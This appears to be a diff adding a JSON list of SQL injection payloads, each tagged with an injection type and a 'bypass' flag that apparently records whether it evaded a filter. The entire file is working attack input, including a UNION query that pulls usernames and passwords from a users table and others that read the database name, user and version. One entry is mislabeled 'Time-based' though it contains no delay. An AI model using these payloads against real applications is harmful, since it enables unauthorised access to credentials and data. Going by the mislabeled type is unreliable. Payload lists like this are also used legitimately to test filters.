@@ -1,0 +1,32 @@
+[
+  {
+    "type": "Error-based",
+    "payload": "' OR 1=1--",
+    "bypass": false
+  },
+  {
+    "type": "Union-based",
+    "payload": "' UNION SELECT null, username, password FROM users--",
+    "bypass": true
+  },
+  {
+    "type": "Blind SQLi",
+    "payload": "' AND SLEEP(5)--",
+    "bypass": true
+  },
+  {
+    "type": "Error-based",
+    "payload": "' OR 'a'='a",
+    "bypass": false
+  },
+  {
+    "type": "Time-based",
+    "payload": "' AND 1=1 UNION SELECT null, version()--",
+    "bypass": true
+  },
+  {
+    "type": "Union-based",
+    "payload": "' AND 1=1 UNION SELECT null, database(), user()--",
+    "bypass": true
+  }
+]
